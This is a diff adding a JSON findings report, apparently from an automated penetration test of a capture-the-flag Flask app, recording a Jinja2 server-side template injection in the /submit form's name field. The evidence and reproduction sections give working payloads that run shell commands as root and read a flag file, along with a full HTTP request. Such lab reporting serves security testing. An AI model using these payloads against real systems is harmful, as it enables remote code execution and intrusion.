@@ -1,0 +1,32 @@
+{
+  "meta": {
+    "created": "2026-04-12T23:07:09.449962+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "b4f2ce3a-e31a-4958-9c44-a7182e40b2ea",
+      "timestamp": "2026-04-12T23:07:09.449812+00:00",
+      "title": "Server-Side Template Injection (SSTI) \u2014 Remote Code Execution via Jinja2",
+      "severity": "critical",
+      "target": "http://172.17.0.1:35841/submit",
+      "description": "The driver application form at /submit reflects user input from the 'name' field directly into a Jinja2 template without sanitization. An attacker can inject Jinja2 template expressions that are evaluated server-side, achieving full Remote Code Execution as root. The application runs on Flask/Werkzeug (Python 3.10.20) and processes the name field with render_template_string or equivalent.",
+      "evidence": "SSTI detection: POST name={{7*7}} \u2192 response 'Thank you 49'\nRCE via lipsum globals: POST name={{lipsum.__globals__['os'].popen('id').read()}} \u2192 'uid=0(root) gid=0(root) groups=0(root)'\nFlag extraction: POST name={{lipsum.__globals__['os'].popen('cat /FLAG.txt').read()}} \u2192 flag{43509ba5-dc71-4a57-b55d-96e228e4ddfe}",
+      "tool_used": "http_request",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "POST /submit HTTP/1.1\nHost: 172.17.0.1:35841\nContent-Type: application/x-www-form-urlencoded\n\nname={{lipsum.__globals__['os'].popen('cat /FLAG.txt').read()}}&email=test@test.com&phone=1234567890&experience=5&license=ABC123",
+        "expected": "flag{43509ba5-dc71-4a57-b55d-96e228e4ddfe}"
+      }
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "097b1099-4e61-4e51-822a-48521f110b1f",
+      "timestamp": "2026-04-12T23:07:22.884763+00:00",
+      "title": "Swift Shipping & Transport - Application Architecture",
+      "mermaid": "flowchart TD\n  Browser[\"Browser (Attacker)\"] --> Home[\"/  Home Page\"]\n  Browser --> About[\"/about  About Us\"]\n  Browser --> AppForm[\"/application  Driver Application Form\"]\n  AppForm --> Submit[\"/submit  POST Handler VULNERABLE\"]\n  Submit --> Jinja2[\"Jinja2 Template Engine\"]\n  Jinja2 -->|\"SSTI via name field\"| OS[\"os.popen RCE as root\"]\n  OS --> Flag[\"/FLAG.txt  flag{43509ba5-dc71-4a57-b55d-96e228e4ddfe}\"]\n  Submit --> Response[\"HTTP 200 Thank you page\"]"
+    }
+  ]
+}
